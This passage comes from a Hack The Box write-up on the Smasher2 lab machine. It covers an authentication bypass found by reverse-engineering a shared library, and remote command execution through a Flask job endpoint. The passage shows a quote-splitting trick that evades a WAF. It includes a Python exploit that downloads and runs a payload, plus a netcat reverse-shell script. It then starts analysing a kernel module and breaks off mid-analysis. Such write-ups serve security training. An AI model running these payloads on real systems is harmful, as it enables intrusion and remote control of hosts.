            <span class="k">if</span> <span class="s">"schedule"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="s">"schedule"</span><span class="p">]])</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Missing schedule parameter."</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ret</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Invalid value provided."</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ret</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Invalid token."</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>


<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</code></pre></div></div>
<p><br>I read the code and these are the things that interest us:
<br>After successful authentication the server will respond with a secret key that we can use to access the endpoint <code class="highlighter-rouge">/api/&lt;key&gt;/job</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="n">ret</span><span class="p">[</span><span class="s">"authenticated"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"endpoint"</span><span class="p">:</span> <span class="n">secret_token_info</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"key"</span><span class="p">:</span> <span class="n">secret_token_info</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"creation_date"</span><span class="p">:</span> <span class="n">secret_token_info</span><span class="p">[</span><span class="mi">2</span><span class="p">]}</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="n">secret_token_info</span> <span class="o">=</span> <span class="p">[</span><span class="s">"/api/&lt;api_key&gt;/job"</span><span class="p">,</span> <span class="n">manager</span><span class="o">.</span><span class="n">secret_key</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())]</span>
</code></pre></div></div>
<p><br>That endpoint only accepts <code class="highlighter-rouge">POST</code> requests:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="s">"/api/&lt;key&gt;/job"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
</code></pre></div></div>
<p><br>And the sent data has to be <code class="highlighter-rouge">json</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
            <span class="o">...</span>
</code></pre></div></div>
<p><br> Through that endpoint we can execute system commands by providing them in a parameter called <code class="highlighter-rouge">schedule</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if</span> <span class="s">"schedule"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="s">"schedule"</span><span class="p">]])</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span>
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="sessionso-analysis--authentication-bypass">session.so: Analysis –&gt; Authentication Bypass</h2>
<p><br><code class="highlighter-rouge">session.so</code> is a compiled shared python library, <code class="highlighter-rouge">so</code> stands for shared object:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2/backup# file ses.so 
ses.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=0c67d40b77854318b10417b4aedfee95a52f0550, not stripped
root@kali:~/Desktop/HTB/boxes/smasher2/backup#
</code></pre></div></div>
<p><br>I opened it in <code class="highlighter-rouge">ghidra</code> and started checking the functions. Two functions caught my attention, <code class="highlighter-rouge">get_internal_pwd()</code> and <code class="highlighter-rouge">get_internal_usr()</code>:<br>
<img src="/images/hackthebox/smasher2/7.png" alt="">
<br><br>I looked at the decompiled code of both of them and noticed something strange, they were the exact same:
<br><code class="highlighter-rouge">get_internal_pwd()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">get_internal_pwd</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">plVar1</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar2</span><span class="p">;</span>
  
  <span class="n">plVar1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">PyObject_GetAttrString</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"user_login"</span><span class="p">);</span>
  <span class="n">uVar2</span> <span class="o">=</span> <span class="n">PyList_GetItem</span><span class="p">(</span><span class="n">plVar1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">uVar2</span> <span class="o">=</span> <span class="n">PyString_AsString</span><span class="p">(</span><span class="n">uVar2</span><span class="p">);</span>
  <span class="o">*</span><span class="n">plVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">plVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">plVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="n">plVar1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))(</span><span class="n">plVar1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">get_internal_usr()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">get_internal_usr</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">plVar1</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar2</span><span class="p">;</span>
  
  <span class="n">plVar1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">PyObject_GetAttrString</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"user_login"</span><span class="p">);</span>
  <span class="n">uVar2</span> <span class="o">=</span> <span class="n">PyList_GetItem</span><span class="p">(</span><span class="n">plVar1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">uVar2</span> <span class="o">=</span> <span class="n">PyString_AsString</span><span class="p">(</span><span class="n">uVar2</span><span class="p">);</span>
  <span class="o">*</span><span class="n">plVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">plVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">plVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="n">plVar1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))(</span><span class="n">plVar1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">smasher2</span><span class="o">/</span><span class="n">backup</span><span class="err">#</span> <span class="n">diff</span> <span class="n">getinternalusr</span> <span class="n">getinternalpwd</span> 
<span class="mi">1</span><span class="n">c1</span>
<span class="o">&lt;</span> <span class="n">undefined8</span> <span class="n">get_internal_usr</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">)</span>
<span class="o">---</span>
<span class="o">&gt;</span> <span class="n">undefined8</span> <span class="n">get_internal_pwd</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">)</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">smasher2</span><span class="o">/</span><span class="n">backup</span><span class="err">#</span>
</code></pre></div></div>
<p><br>So in theory, since the two function are identical, providing the username as a password should work. Which means that it’s just a matter of finding an existing username and we’ll be able to bypass the authentication.
<br>I tried some common usernames before attempting to use <code class="highlighter-rouge">wfuzz</code>, <code class="highlighter-rouge">Administrator</code> worked:<br>
<img src="/images/hackthebox/smasher2/8.png" alt="">
<br><br>
<img src="/images/hackthebox/smasher2/9.png" alt="">
<br></p>
<hr>

<h2 id="waf-bypass--rce--shell-as-dzonerzy--root-flag">WAF Bypass –&gt; RCE –&gt; Shell as dzonerzy –&gt; Root Flag</h2>
<p><br>I wrote a small script to execute commands through <code class="highlighter-rouge">/api/&lt;key&gt;/job</code> as we saw earlier in <code class="highlighter-rouge">auth.py</code>, the script was meant for testing purposes:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">post</span>

<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"session"</span><span class="p">:</span><span class="s">"eyJpZCI6eyIgYiI6Ik16UXpNakpoTVRVeVlqaGlNekJsWVdSbU9HTXlPV1kzTmprMk1XSTROV00xWkdVME5HTmxNQT09In19.XfNxUQ.MznJKgs2isklCZxfV4G0IjEPcvg"</span><span class="p">}</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"cmd: "</span><span class="p">)</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">post</span><span class="p">(</span><span class="s">"http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"schedule"</span><span class="p">:</span><span class="n">cmd</span><span class="p">},</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
	<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
</code></pre></div></div>
<p><br>Testing with <code class="highlighter-rouge">whoami</code> worked just fine:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# ./test.py 
cmd: whoami
{"result":"dzonerzy\n","success":true}

cmd:
</code></pre></div></div>
<p><br>However when I tried other commands I got a <code class="highlighter-rouge">403</code> response indicating that the server was protected by a <code class="highlighter-rouge">WAF</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd: curl http://10.10.xx.xx
<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
<span class="nt">&lt;html&gt;&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>403 Forbidden<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;</span>Forbidden<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You don't have permission to access /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job
on this server.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;hr&gt;</span>
<span class="nt">&lt;address&gt;</span>Apache/2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80<span class="nt">&lt;/address&gt;</span>
<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>

cmd:
</code></pre></div></div>
<p><br>I could easily bypass it by inserting single quotes in the command:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd: 'w'g'e't 'h't't'p':'/'/'1'0'.'1'0'.'x'x'.'x'x'/'t'e's't'
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;500 Internal Server Error&lt;/title&gt;
&lt;h1&gt;Internal Server Error&lt;/h1&gt;
&lt;p&gt;The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.&lt;/p&gt;

cmd:
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.135 - - [13/Dec/2019 08:18:33] code 404, message File not found
10.10.10.135 - - [13/Dec/2019 08:18:33] "GET /test HTTP/1.1" 404 -
</code></pre></div></div>
<p><br>To automate the exploitation process I wrote this small exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://wonderfulsessionmanager.smasher2.htb/auth"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"action"</span><span class="p">:</span><span class="s">"auth"</span><span class="p">,</span><span class="s">"data"</span><span class="p">:{</span><span class="s">"username"</span><span class="p">:</span><span class="s">"Administrator"</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="s">"Administrator"</span><span class="p">}})</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
	<span class="n">key</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">'result'</span><span class="p">][</span><span class="s">'key'</span><span class="p">]</span>
	<span class="k">return</span> <span class="n">key</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
	<span class="n">download_payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\'</span><span class="s">w</span><span class="se">\'</span><span class="s">g</span><span class="se">\'</span><span class="s">e</span><span class="se">\'</span><span class="s">t </span><span class="se">\'</span><span class="s">h</span><span class="se">\'</span><span class="s">t</span><span class="se">\'</span><span class="s">t</span><span class="se">\'</span><span class="s">p</span><span class="se">\'</span><span class="s">:</span><span class="se">\'</span><span class="s">/</span><span class="se">\'</span><span class="s">/</span><span class="se">\'</span><span class="s">1</span><span class="se">\'</span><span class="s">0</span><span class="se">\'</span><span class="s">.</span><span class="se">\'</span><span class="s">1</span><span class="se">\'</span><span class="s">0</span><span class="se">\'</span><span class="s">.</span><span class="se">\'</span><span class="s">x</span><span class="se">\'</span><span class="s">x</span><span class="se">\'</span><span class="s">.</span><span class="se">\'</span><span class="s">x</span><span class="se">\'</span><span class="s">x</span><span class="se">\'</span><span class="s">/</span><span class="se">\'</span><span class="s">s</span><span class="se">\'</span><span class="s">h</span><span class="se">\'</span><span class="s">e</span><span class="se">\'</span><span class="s">l</span><span class="se">\'</span><span class="s">l</span><span class="se">\'</span><span class="s">.</span><span class="se">\'</span><span class="s">s</span><span class="se">\'</span><span class="s">h</span><span class="se">\'</span><span class="s">"</span>
	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Downloading payload"</span><span class="p">)</span>
	<span class="n">download_req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://wonderfulsessionmanager.smasher2.htb/api/{}/job"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"schedule"</span><span class="p">:</span><span class="n">download_payload</span><span class="p">})</span>
	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Done"</span><span class="p">)</span>
	<span class="n">exec_payload</span> <span class="o">=</span> <span class="s">"s</span><span class="se">\'</span><span class="s">h</span><span class="se">\'</span><span class="s"> </span><span class="se">\'</span><span class="s">s</span><span class="se">\'</span><span class="s">h</span><span class="se">\'</span><span class="s">e</span><span class="se">\'</span><span class="s">l</span><span class="se">\'</span><span class="s">l</span><span class="se">\'</span><span class="s">.</span><span class="se">\'</span><span class="s">s</span><span class="se">\'</span><span class="s">h"</span>
	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Executing payload"</span><span class="p">)</span>
	<span class="n">exec_req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://wonderfulsessionmanager.smasher2.htb/api/{}/job"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"schedule"</span><span class="p">:</span><span class="n">exec_payload</span><span class="p">})</span>
	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Done. Exiting ..."</span><span class="p">)</span>
	<span class="nb">exit</span><span class="p">()</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://wonderfulsessionmanager.smasher2.htb/login"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span><span class="s">"[+] Authenticating"</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">getKey</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Session: "</span> <span class="o">+</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s">'session'</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] key: "</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
<span class="n">exploit</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</code></pre></div></div>
<p><br>The exploit sends 2 commands, the first one is a <code class="highlighter-rouge">wget</code> command that downloads <code class="highlighter-rouge">shell.sh</code> and the other one executes it. 
<br><code class="highlighter-rouge">shell.sh</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.xx.xx 1337 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>
<p><br>I hosted it on a python server and I started a <code class="highlighter-rouge">netcat</code> listener on port 1337 then I ran the exploit:<br>
<img src="/images/hackthebox/smasher2/10.png" alt="">
<br><br>We owned user.
<br></p>
<hr>

<h2 id="dhidko-enumeration">dhid.ko: Enumeration</h2>
<p><br>After getting a shell I copied my public <code class="highlighter-rouge">ssh</code> key to <code class="highlighter-rouge">/home/dzonerzy/.ssh/authorized_keys</code> and got ssh access. 
<br>In the home directory of <code class="highlighter-rouge">dzonerzy</code> there was a <code class="highlighter-rouge">README</code> containing a message from him saying that we’ll need to think outside the box to root smasher2:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:~$ ls -al
total 44
drwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .
drwxr-xr-x 3 root     root     4096 Feb 15  2019 ..
lrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout
-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc
drwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache
drwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg
drwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local
-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile
-rw-r--r-- 1 root     root      900 Feb 16  2019 README
drwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 13 12:50 smanager
-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt
dzonerzy@smasher2:~$ cat README 


         .|'''.|                            '||                      
         ||..  '  .. .. ..    ....    ....   || ..     ....  ... ..  
          ''|||.   || || ||  '' .||  ||. '   ||' ||  .|...||  ||' '' 
        .     '||  || || ||  .|' ||  . '|..  ||  ||  ||       ||     
        |'....|'  .|| || ||. '|..'|' |'..|' .||. ||.  '|...' .||.    v2.0 
                                                             
                                                        by DZONERZY 

Ye you've come this far and I hope you've learned something new, smasher wasn't created
with the intent to be a simple puzzle game... but instead I just wanted to pass my limited
knowledge to you fellow hacker, I know it's not much but this time you'll need more than
skill, you will need to think outside the box to complete smasher 2 , have fun and happy

                                       Hacking!

free(knowledge);
free(knowledge);
* error for object 0xd00000000b400: pointer being freed was not allocated *


dzonerzy@smasher2:~$ 
</code></pre></div></div>
<p><br>After some enumeration, I checked the <code class="highlighter-rouge">auth</code> log and saw this line:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:~$ cat /var/log/auth.log
----------
 Redacted
----------
Dec 13 11:49:34 smasher2 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
----------
 Redacted
----------
dzonerzy@smasher2:~$
</code></pre></div></div>
<p><br><code class="highlighter-rouge">insmod</code> (stands for <code class="highlighter-rouge">insert module</code>) is a tool used to load kernel modules. <code class="highlighter-rouge">dhid.ko</code> is a kernel module (<code class="highlighter-rouge">ko</code> stands for kernel object)</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:~$ cd /lib/modules/4.15.0-45-generic/kernel/drivers/hid/
dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$ file dhid.ko 
dhid.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=d4315261f7c9c38393394f6779378abcff6270d2, not stripped
dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$
</code></pre></div></div>
<p><br>I checked the loaded kernel modules and that module was still loaded:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$ lsmod | grep dhid
dhid                   16384  0
dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$
</code></pre></div></div>
<p><br>We can use <code class="highlighter-rouge">modinfo</code> to list the information about that module, as you can see it was written by <code class="highlighter-rouge">dzonerzy</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$ modinfo dhid
filename:       /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
version:        1.0
description:    LKM for dzonerzy dhid devices
author:         DZONERZY
license:        GPL
srcversion:     974D0512693168483CADFE9
depends:        
retpoline:      Y
name:           dhid
vermagic:       4.15.0-45-generic SMP mod_unload 
dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$ 
</code></pre></div></div>
<p><br>Last thing I wanted to check was if there was device driver file for the module:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$ ls -la /dev/ | grep dhid
crwxrwxrwx  1 root root    243,   0 Dec 13 11:49 dhid
dzonerzy@smasher2:/lib/modules/4.15.0-45-generic/kernel/drivers/hid$ 
</code></pre></div></div>
<p><br>I downloaded the module on my box to start analyzing it:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# scp -i id_rsa dzonerzy@smasher2.htb:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./ 
dhid.ko                                                                                                                                                                                                  100% 8872    16.1KB/s   00:00    
root@kali:~/Desktop/HTB/boxes/smasher2# file dhid.ko 
dhid.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=d4315261f7c9c38393394f6779378abcff6270d2, not stripped
root@kali:~/Desktop/HTB/boxes/smasher2#
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="dhidko-analysis">dhid.ko: Analysis</h2>
<p><br>I opened the module in <code class="highlighter-rouge">ghidra</code> then I started checking the functions:<br>
<img src="/images/hackthebox/smasher2/11.png" alt="">
<br><br>The function <code class="highlighter-rouge">dev_read()</code> had a hint that this is the intended way to root the box:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">long</span> <span class="nf">dev_read</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  
  <span class="n">__fentry__</span><span class="p">();</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">_copy_to_user</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="s">"This is the right way, please exploit this shit!"</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="o">-</span><span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xe</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br>One interesting function that caught my attention was <code class="highlighter-rouge">dev_mmap()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ulong</span> <span class="nf">dev_mmap</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="n">ulong</span> <span class="n">uVar2</span><span class="p">;</span>
